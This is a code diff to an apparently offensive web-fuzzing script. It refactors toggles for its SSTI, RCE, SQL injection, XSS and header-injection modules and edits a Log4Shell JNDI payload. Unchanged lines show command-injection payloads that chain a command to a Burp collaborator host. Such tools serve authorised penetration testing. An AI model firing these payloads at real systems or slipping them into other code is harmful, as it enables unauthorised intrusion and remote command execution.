@@ -91,67 +91,87 @@ cheat_code=cheat_code.lower()+"header"
 
 print()
 
-if "post" in cheat_code or "1" in cheat_code:
-    print("\t✨post request is disabled")
-    enable_post=False
-else:
-    enable_post=True
+if "only" not in cheat_code:
+    enable_post = enable_ssti = enable_rce = enable_sql = enable_xss = enable_owasp = enable_header_inject = True
+    reset_count = single_mode = False
     
-if "ssti" in cheat_code or "2" in cheat_code:
-    enable_ssti=False
-    print("\t✨SSTI is disabled")
-else:
-    enable_ssti=True
+    # Check cheat codes and update settings accordingly
+    if "post" in cheat_code or "1" in cheat_code:
+        enable_post = False
+        print("\t✨ Post request is disabled")
     
-if "rce" in cheat_code or "3" in cheat_code:
-    enable_rce=False
-    print("\t✨RCE is disabled")
-else:
-    enable_rce=True
+    if "ssti" in cheat_code or "2" in cheat_code:
+        enable_ssti = False
+        print("\t✨ SSTI is disabled")
     
-if "sql" in cheat_code or "4" in cheat_code:
-    enable_sql=False
-    print("\t✨sql is disabled")
-else:
-    enable_sql=True
+    if "rce" in cheat_code or "3" in cheat_code:
+        enable_rce = False
+        print("\t✨ RCE is disabled")
     
-if "xss" in cheat_code or "5" in cheat_code:
-    enable_xss=False
-    cheat_code=cheat_code+"owasp" #diable also owasp xss
-    print("\t✨xss is disabled")
-else:
-    enable_xss=True
+    if "sql" in cheat_code or "4" in cheat_code:
+        enable_sql = False
+        print("\t✨ SQL is disabled")
     
-if "owasp" in cheat_code or "6" in cheat_code:
-    enable_owasp=False
-    print("\t✨owasp xss payloads are disabled")
-else:
-    enable_owasp=True
+    if "xss" in cheat_code or "5" in cheat_code:
+        enable_xss = False
+        cheat_code += "owasp"  # Disable OWASP XSS as well
+        print("\t✨ XSS is disabled")
+    
+    if "owasp" in cheat_code or "6" in cheat_code:
+        enable_owasp = False
+        print("\t✨ OWASP XSS payloads are disabled")
+    
+    if "header" in cheat_code or "7" in cheat_code:
+        enable_header_inject = False
+        print("\t✨ Header injection is disabled")
+    
+    if "reset" in cheat_code:
+        reset_count = True
+        print("\t✨ Count will be reset to 0")
+    
+    if "single" in cheat_code.lower():
+        enable_ssti = enable_owasp = enable_sql = enable_rce = enable_xss = enable_header_inject = False
+        print("\t✨ Only single simple XSS (all others are in disable mode)")
+        single_mode = True
 
-if "header" in cheat_code or "7" in cheat_code:
-    enable_header_inject=False
-    print("\t✨header injection is disabled")
 else:
-    enable_header_inject=True
-
-if "reset" in cheat_code:
-    reset_count=True
-    print("\t✨count will be reset to 0")
-else:
-    reset_count=False
+    # Handle the case when "only" is present in cheat_code
+    enable_post = enable_ssti = enable_rce = enable_sql = enable_xss = enable_owasp = enable_header_inject = False
+    reset_count = single_mode = False
     
-if "single" in cheat_code or "SINGLE" in cheat_code or "Single" in cheat_code :
-    enable_ssti=False
-    enable_owasp=False
-    enable_sql=False
-    enable_rce=False
-    enable_xss=False
-    enable_header_inject=False
+    # Check cheat codes and update settings accordingly (opposite of the "not in" block)
+    if "post" in cheat_code or "1" in cheat_code:
+        enable_post = True
+        print("\t✨ Post request is enabled")
+    
+    if "ssti" in cheat_code or "2" in cheat_code:
+        enable_ssti = True
+        print("\t✨ SSTI is enabled")
+    
+    if "rce" in cheat_code or "3" in cheat_code:
+        enable_rce = True
+        print("\t✨ RCE is enabled")
+    
+    if "sql" in cheat_code or "4" in cheat_code:
+        enable_sql = True
+        print("\t✨ SQL is enabled")
+    
+    if "xss" in cheat_code or "5" in cheat_code:
+        enable_xss = True
+        cheat_code += "owasp"  # Enable OWASP XSS as well
+        print("\t✨ XSS is enabled")
+    
+    if "owasp" in cheat_code or "6" in cheat_code:
+        enable_owasp = True
+        print("\t✨ OWASP XSS payloads are enabled")
+    
+    if "header" in cheat_code or "7" in cheat_code:
+        enable_header_inject = True
+        print("\t✨ Header injection is enabled")
+    
+    if "reset" in cheat_code:
+        reset_count = False  # Reset is not performed in "only" mode
 
-    print("\t✨only single simple xss (all others are in disable mode)")
-    single_mode=True
-else:
-    single_mode=False
     
 time.sleep(3)
 #***********************************************************************
@@ -1551,7 +1571,7 @@ for url_for_fuzz in unique_urls:
                 PL1=(cmd+' '+user_burp_input2)
                 PL2=(value+" ; "+cmd+' '+user_burp_input2+' ; ls')
                 PL3=(value+" %26%26 "+cmd+' '+user_burp_input2+' %26%26 ls')
-                PL4=("${jndi:ldap://log4j"+user_burp_input2+':8080/abhi4j}')
+                PL4=("${jndi:ldap://log4j."+user_burp_input2+':8080/abhi4j}')
                 PL5=(value+" || "+cmd+" "+user_burp_input2+' || ls')
                 PL6=(value+" `"+cmd+" "+user_burp_input2+"` ls")
                 PL7=(value+" $("+cmd+" "+user_burp_input2+") ls")
